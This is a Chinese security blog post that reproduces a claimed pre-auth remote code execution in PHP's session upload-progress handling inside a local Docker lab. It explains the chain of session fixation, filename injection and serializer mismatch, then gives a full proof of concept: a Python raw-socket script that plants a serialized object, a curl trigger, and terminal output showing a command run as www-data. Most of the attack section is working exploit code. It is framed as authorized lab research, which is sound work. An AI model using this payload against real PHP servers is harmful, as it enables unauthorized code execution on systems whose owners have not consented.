#  已复现 | PHP 会话反序列化 RCE：从靶场搭建到命令执行  
原创 陆安予
                    陆安予  白帽子安全笔记2.0   2026-10-21 16:48  
  
   
  
摘要：本文记录在本地 Docker 靶场中复现 CVE-2026-109618 / CVE-2026-109619 的全过程。所有操作均在本机授权靶场完成，仅用于安全学习与研究。请勿对任何未授权目标使用文中技术。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibXL9MCj2GqOwWc9f3FZpQf7A1jXVEtN2JiaAe1dUxknSziczszRfrNPQcT2XAia39JkOHLVs5r8ic3o2QersbJ77ReFlTYCC5IZrJJro7AcNhF0/640?wx_fmt=png&from=appmsg "null")  
  
## 一、这是什么  
  
PHP 的 session.upload_progress 机制本意是让应用能追踪文件上传进度。但当它与会话序列化处理器、会话固定、文件名处理等环节组合时，会形成一条完整的利用链：  
1. 1. 会话固定：通过 Cookie 或请求体指定 PHPSESSID，绕过 session.use_only_cookies 的限制。  
  
1. 2. 文件名注入：上传文件的 filename 会被原样写入 session 文件，不做转义。  
  
1. 3. 处理器错位：同一份 session 文件，在 A 目录用 php_serialize 写入，在 B 目录用 php 读取，导致按 | 分割后反序列化攻击者注入的对象。  
  
1. 4. __destruct 触发：即使解码失败，对象已被创建，销毁时 __destruct 仍会执行。  
  
最终效果：未授权远程代码执行（pre-auth RCE），CVSS 4.0 评分 9.2。影响 PHP 5.4.0 至 8.5.11。  
## 二、靶场搭建  
  
靶场由 docker-compose 编排两个容器：  
- • php2shell-lab：PHP 8.2.34 FPM，挂载 webroot/ 和自定义 php.ini。  
  
- • php2shell-nginx：Nginx 反向代理，对外暴露 18080 端口。  
  
关键目录结构：  
```
webroot/
├── app/
│   ├── .user.ini          # session.serialize_handler = php_serialize
│   └── upload.php         # 写入端，带 session_start()
├── api/
│   ├── .user.ini          # session.serialize_handler = php
│   └── endpoint.php       # 触发端，先定义 Exploit 类，再 session_start()
└── vuln.php               # 模拟 LFI（可选）
```  
  
关键 php.ini 配置：  
```
session.save_handler = files
session.save_path = /tmp/sessions
session.use_strict_mode = 0
session.use_only_cookies = 0
session.use_cookies = 1
session.upload_progress.enabled = On
session.upload_progress.cleanup = Off
session.upload_progress.prefix = upload_progress_
session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS
```  
  
启动：  
```
./setup.sh
```  
## 三、完整POC  
  
第一步：用 Python 一行脚本写入合法 payload  
```
python3 - <<'PY'
import socket
host, port = "127.0.0.1", 18080
sid = "mismatchverify0000000000000"
filename = 'x|O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}'
escaped = filename.replace('"', '\\"')
boundary = "MISMATCH"
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="f"; filename="{escaped}"\r\n\r\nZ\r\n'
    f"--{boundary}--\r\n"
).encode("latin-1")
req = (
    f"POST /app/upload.php HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Cookie: PHPSESSID={sid}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body
s = socket.create_connection((host, port), timeout=15)
s.sendall(req)
s.settimeout(10)
resp = b""
while True:
    try:
        d = s.recv(65536)
        if not d: break
        resp += d
    except socket.timeout: break
s.close()
print(resp.split(b"\r\n",1)[0].decode())
PY
```  
  
第二步：触发  
```
curl -s -X POST http://127.0.0.1:18080/api/endpoint.php \
  -H "Cookie: PHPSESSID=mismatchverify0000000000000"
```  
  
第三步：看pwn  
```
docker exec -it php2shell-lab cat /tmp/pwned.txt

```  
## 四、验证过程与结果  
  
PWN 成功！  
```
                                                                                            
┌──(root㉿kali)-[/home/kali/Desktop]
└─# docker exec -it php2shell-lab cat /tmp/pwned.txt
cat: /tmp/pwned.txt: No such file or directory
                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop]
└─# >....                                                                                    
filename = 'x|O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}'
escaped = filename.replace('"', '\\"')
boundary = "MISMATCH"
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="f"; filename="{escaped}"\r\n\r\nZ\r\n'
    f"--{boundary}--\r\n"
).encode("latin-1")
req = (
    f"POST /app/upload.php HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Cookie: PHPSESSID={sid}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body
s = socket.create_connection((host, port), timeout=15)
s.sendall(req)
s.settimeout(10)
resp = b""
while True:
    try:
        d = s.recv(65536)
        if not d: break
        resp += d
    except socket.timeout: break
s.close()
print(resp.split(b"\r\n",1)[0].decode())
PY
HTTP/1.1 200 OK
                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop]
└─# curl -s -X POST http://127.0.0.1:18080/api/endpoint.php \
  -H "Cookie: PHPSESSID=mismatchverify0000000000000"
<br />
<b>Warning</b>:  session_start(): Failed to decode session object. Session has been destroyed in <b>/var/www/html/api/endpoint.php</b> on line <b>8</b><br />
api ok
                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop]
└─# docker exec -it php2shell-lab cat /tmp/pwned.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop]
└─# 


```  
  
![CVE-2026-109618 和 CVE-2026-109619](https://mmbiz.qpic.cn/sz_mmbiz_png/ibXL9MCj2GqMxDw8twmKDsYr5XdbVCgvdy0bbvhoRxHaPF4rxCW6nZVSCTzDOpg2k48tAh6caKVSIkMHvPDFMN9mr6aR11C7SlEGoJVG5Sw8/640?wx_fmt=png&from=appmsg "null")  
  
CVE-2026-109618 和 CVE-2026-109619  
  
获取修改后的安装环境部署脚本：回复20261022  
获取。  
> **警告**  
：仅限本地 Docker 靶场。真实漏洞影响 PHP 5.4.0–8.5.11，修复版本 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12。不要对任何未授权目标使用。  
  
  
   
  
  
